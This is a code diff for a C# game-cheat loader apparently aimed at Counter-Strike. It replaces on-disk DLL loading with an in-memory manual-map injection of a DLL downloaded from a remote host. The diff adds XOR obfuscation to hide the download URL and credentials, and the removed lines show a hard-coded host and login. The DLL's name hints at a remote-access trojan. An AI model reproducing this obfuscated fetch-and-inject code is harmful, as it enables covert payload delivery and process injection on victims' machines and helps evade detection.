@@ -72,17 +72,17 @@ namespace FearLess.cc
 
         bool injectOld()
         {
+            return false;
+            //DllInjector dj = new DllInjector();
 
-            DllInjector dj = new DllInjector();
-
-            if (dj.Inject("csgo", "dll.idkid"))
-            {
-                return true;
-            }
-            else
-            {
-                return false;
-            }
+            //if (dj.Inject("csgo", "dll.idkid"))
+            //{
+                //return true;
+            //}
+            //else
+            //{
+                //return false;
+            //}
         }
         void inject()
         {
@@ -167,15 +167,16 @@ namespace FearLess.cc
                 var target = Process.GetProcessesByName(name).FirstOrDefault();
 
                 //Checking if the DLL isn't found
-                if (!File.Exists(pat + "\\imaratforurpcccccc1234io1uJKFDHOIAFANL.dll"))
-                {
-                    MessageBox.Show("Unknown Error!");
-                    return;
-                }
-
+                //if (!File.Exists(pat + "\\imaratforurpcccccc1234io1uJKFDHOIAFANL.dll"))
+                //{
+                    //MessageBox.Show("Unknown Error!");
+                    //return;
+                //}
+                
+				var file = getDllsByte();
                 //Injection, just leave this alone if you are a beginner
                 var injector = new ManualMapInjector(target) { AsyncInjection = true };
-                Console.WriteLine("Infos: " + $"hmodule = 0x{injector.Inject(pat + "\\imaratforurpcccccc1234io1uJKFDHOIAFANL.dll").ToInt64():x8}");
+                Console.WriteLine("Infos: " + $"hmodule = 0x{injector.Inject(file).ToInt64():x8}");
 
                 if (System.IO.File.Exists(pat + "\\imaratforurpcccccc1234io1uJKFDHOIAFANL.dll")) //Checking if the DLL exists
                 {
@@ -193,26 +194,30 @@ namespace FearLess.cc
 
         }
 
+        public string xor(string text, string key)
+        {
+            var result = new StringBuilder();
+            for (int c = 0; c < text.Length; c++)
+                result.Append((char)((uint)text[c] ^ (uint)key[c % key.Length]));
+            return result.ToString();
+        }
+
         public byte[] getDllsByte()
         {
 
-                WebClient cli = new WebClient();
-                cli.Credentials = new NetworkCredential("HxInbgoiduGIngo", "Jfgnbdiwhgonedhg");
-                byte[] bytes = cli.DownloadData(@"https://sidesense.eu/main/imaratforurpcccccc1234io1uJKFDHOIAFANL.dll");
+            WebClient cli = new WebClient();
+            cli.Credentials = new NetworkCredential(xor("!$$%", "immaraturpclmaothatsdakey"), xor("#\n", "immaraturpclmaothatsdakey"));
+            byte[] bytes = cli.DownloadData(@xor("[[Z\t\rOK\nF\x00\x00\x00\x00\x00BVR_X'*4%<:;1%-#-A\r", "immaraturpclmaothatsdakey"));
 
                 //File.WriteAllBytes(pat + "\\imaratforurpcccccc1234io1uJKFDHOIAFANL.dll", bytes);
-                return bytes;
+            return bytes;
      
         }
         public bool ByteArrayToFile()
         {
             try
             {
-                WebClient cli = new WebClient();
-                cli.Credentials = new NetworkCredential("HxInbgoiduGIngo", "Jfgnbdiwhgonedhg");
-                byte[] bytes = cli.DownloadData(@"https://sidesense.eu/main/imaratforurpcccccc1234io1uJKFDHOIAFANL.dll");
 
-                File.WriteAllBytes(pat + "\\imaratforurpcccccc1234io1uJKFDHOIAFANL.dll", bytes);
                 return true;
             }
             catch (Exception ex)
